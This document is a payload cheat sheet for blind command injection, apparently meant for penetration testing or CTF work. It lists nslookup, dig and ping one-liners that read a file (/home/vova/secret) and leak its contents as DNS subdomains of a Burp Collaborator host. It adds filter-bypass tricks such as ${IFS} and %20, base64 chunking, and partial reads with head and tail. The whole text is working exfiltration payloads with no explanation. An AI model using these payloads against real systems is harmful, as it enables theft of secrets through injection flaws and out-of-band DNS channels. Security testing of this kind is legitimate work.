## nslookup:

```
nslookup $(cat /home/vova/secret).burp.oastify.com
nslookup $(</home/vova/secret).burp.oastify.com
nslookup -q=cname $(cat /home/vova/secret).burp.oastify.com
nslookup -type=a $(cat /home/vova/secret).burp.oastify.com
```

## dig:

```
dig $(cat /home/vova/secret).burp.oastify.com
dig txt $(cat /home/vova/secret).burp.oastify.com
dig a $(cat /home/vova/secret).burp.oastify.com
dig @8.8.8.8 $(cat /home/vova/secret).burp.oastify.com
```

## ping:

```
ping -c 1 $(cat /home/vova/secret).burp.oastify.com
ping -c 1 $(</home/vova/secret).burp.oastify.com
```

## Combination of commands for bypass input:

```
nslookup $(cat$IFS/home/vova/secret).burp.oastify.com
nslookup $(< /home/vova/secret).burp.oastify.com
```

## encoding or additional bypass characters:

```
nslookup $(cat%20/home/vova/secret).burp.oastify.com
nslookup $(cat${IFS}/home/vova/secret).burp.oastify.com
```

## via base64 to split the output into parts (if the file is long):

```
nslookup $(base64 /home/vova/secret | head -c10).burp.oastify.com
nslookup $(base64 /home/vova/secret | tail -c10).burp.oastify.com
```

## Sectional information extraction:

```
nslookup $(head -c5 /home/vova/secret).burp.oastify.com
nslookup $(tail -c5 /home/vova/secret).burp.oastify.com
```

## Using an environment variable (if possible):

```
nslookup $(cat /home/$USER/secret).burp.oastify.com
```
